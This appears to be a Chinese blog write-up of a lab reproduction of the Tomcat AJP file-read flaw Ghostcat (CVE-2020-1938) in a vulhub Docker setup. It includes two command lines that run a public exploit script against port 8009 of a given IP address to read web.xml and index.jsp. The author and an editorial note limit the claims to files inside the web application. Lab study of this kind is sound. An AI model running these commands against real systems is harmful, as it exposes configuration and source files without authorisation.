ailx10说：这篇是我2024年10月写的。这回从 Tomcat 的 AJP 端口入手，跟着脚本读取应用里的 web.xml 和 JSP 文件，看看不经过普通 Web 页面还能拿到哪些内容。做完以后，我特意把范围记在笔记里：这次看到的是 Web 应用目录里的文件，不是随便指定一个系统绝对路径就都能读。它更像一次认识另一条服务通道的练习，端口是否可达也得先确认。Ghostcat 常常和代码执行一起被提到，但我这篇实际展示到哪一步，就只把证据写到哪一步。

编辑核查提示：实验展示读取应用内资源，AJP 接口需可达；不能据此断言任意系统绝对路径均可读取或本次已实现代码执行。 原题代码和外部地址未重新运行；截图细字及水印仍待核对。

本文记录 Tomcat AJP 请求注入（CVE-2020-1938，Ghostcat）的历史文件读取实验。AJP 接口的可达性及实际版本配置是重要前提，示例仅展示读取 Web 应用内资源。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build` `//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）环境搭建成功了

![](/notes-assets/31989b447cf7cc606b5d.webp)

（1）使用 Python2.7 脚本[\[1\]](#ref_1)，文件读取 `/WEB-INF/web.xml`

```
python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml 144.34.162.13
```

![](/notes-assets/909f0973ffc11d452afa.webp)

（2）读取 `index.jsp` 文件

```
python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f index.jsp 144.34.162.13
```

![](/notes-assets/e05fc0bd6f907e70412b.webp)

原实验读取了 ROOT Web 应用中的示例资源，不应扩展为任意系统绝对路径都可读取。
